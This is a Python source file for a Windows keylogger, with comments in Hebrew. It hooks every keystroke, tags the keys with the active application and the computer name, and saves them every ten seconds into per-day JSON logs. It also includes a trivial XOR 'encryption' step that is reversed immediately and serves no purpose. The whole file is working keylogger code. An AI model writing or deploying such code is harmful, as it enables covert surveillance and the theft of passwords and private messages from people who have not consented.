
import time
import keyboard
import threading
import win32gui
import win32process
import psutil
import os
import json
import socket
from datetime import datetime

print("Keylogger agent started.")
def get_source_computer_name():
    """מחזיר את שם המחשב שממנו מגיעות ההקשות"""
    return socket.gethostname()

def get_active_window():
    """מחזיר את שם התהליך של החלון הפעיל"""
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        process = psutil.Process(pid)
        return process.name()
    except Exception:
        return "Unknown"

class KeyLoggerService:
    def __init__(self):
        self.buffer = {}  # Changed to dictionary to separate by timestamp
        self.running = False
        self.lock = threading.Lock()
        self.source_computer = get_source_computer_name()

    def start_listening(self):
        self.running = True
        keyboard.on_press(self.record_key)

    def record_key(self, event):
        with self.lock:
            current_time = datetime.now()
            timestamp_key = current_time.strftime("%Y-%m-%d_%H-%M")  # Using underscore for filename compatibility
            
            if timestamp_key not in self.buffer:
                self.buffer[timestamp_key] = {
                    "source_computer": self.source_computer,
                    "timestamp": current_time.strftime("%Y-%m-%d %H:%M"),
                    "window": get_active_window(),
                    "keys": []
                }

            if event.name == "space":
                self.buffer[timestamp_key]["keys"].append(" ")
            elif event.name == "enter":
                self.buffer[timestamp_key]["keys"].append("\n")
            elif len(event.name) == 1:
                self.buffer[timestamp_key]["keys"].append(event.name)

    def stop_listening(self):
        self.running = False
        keyboard.unhook_all()

    def get_buffer(self):
        with self.lock:
            data = self.buffer.copy()
            self.buffer.clear()
        return data

class JsonFileManager:
    def __init__(self, base_path="keylogger_data"):
        self.base_path = base_path

    def ensure_directory_exists(self, directory):
        """יוצר תיקייה אם היא לא קיימת"""
        if not os.path.exists(directory):
            os.makedirs(directory)

    def save_data(self, data_dict):
        """שומר את הנתונים כך שכל יום יהיה קובץ אחד, והקלדות יתאחדו לפי timestamp+window"""
        for timestamp_key, entry in data_dict.items():
            computer_name = entry["source_computer"]
            date_str = timestamp_key.split('_')[0]  # YYYY-MM-DD
            time_str = entry["timestamp"]  # תאריך מלא YYYY-MM-DD HH:MM
            window_name = entry["window"]  # שם החלון

            #  יצירת תיקיות
            computer_dir = os.path.join(self.base_path, computer_name)
            self.ensure_directory_exists(computer_dir)

            date_dir = os.path.join(computer_dir, date_str)
            self.ensure_directory_exists(date_dir)

            #  קובץ JSON יומי יחיד
            json_filename = "log.json"
            json_path = os.path.join(date_dir, json_filename)

            #  טעינת נתונים קיימים
            if os.path.exists(json_path):
                with open(json_path, 'r', encoding='utf-8') as f:
                    existing_data = json.load(f)
            else:
                existing_data = {"source_computer": computer_name, "date": date_str, "entries": []}

            #  חיפוש רשומה קיימת עם אותו timestamp ואותו window
            found = False
            for entry_data in existing_data["entries"]:
                if entry_data["timestamp"] == time_str and entry_data["window"] == window_name:
                    entry_data["keys"].extend(entry["keys"])  # הוספת מקשים לרשומה קיימת
                    found = True
                    break

            #  אם לא נמצאה רשומה, יוצרים רשומה חדשה
            if not found:
                existing_data["entries"].append({
                    "timestamp": time_str,
                    "window": window_name,
                    "keys": entry["keys"]
                })

            # 6️ שמירת הנתונים חזרה לקובץ
            with open(json_path, 'w', encoding='utf-8') as f:
                json.dump(existing_data, f, ensure_ascii=False, indent=2)

            print(f"Update {json_path}")  # לוודא שזה עובד


class Encryptor:
    def __init__(self, key=5):
        self.key = key

    def encrypt(self, data):
        json_str = json.dumps(data)
        return ''.join(chr(ord(char) ^ self.key) for char in json_str)

    def decrypt(self, encrypted_data):
        decrypted_str = ''.join(chr(ord(char) ^ self.key) for char in encrypted_data)
        return json.loads(decrypted_str)

class KeyLoggerManager:
    def __init__(self):
        self.key_logger_service = KeyLoggerService()
        self.encryptor = Encryptor()
        self.file_manager = JsonFileManager()
        self.running = False

    def run(self):
        self.running = True
        listener_thread = threading.Thread(target=self.key_logger_service.start_listening)
        writer_thread = threading.Thread(target=self.write_periodically, daemon=True)
        listener_thread.start()
        writer_thread.start()
        return listener_thread, writer_thread

    def stop(self):
        self.key_logger_service.stop_listening()
        self.running = False

    def write_periodically(self, interval=10):
        while self.running:
            time.sleep(interval)
            self.write_data()

    def write_data(self):
        data = self.key_logger_service.get_buffer()
        if data:
            encrypted_data = self.encryptor.encrypt(data)
            decrypted_data = self.encryptor.decrypt(encrypted_data)
            self.file_manager.save_data(decrypted_data)

def main():
    klm = KeyLoggerManager()
    listener_thread, writer_thread = klm.run()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        klm.stop()
        print("Keylogger stopped.")

if __name__ == "__main__":
    main()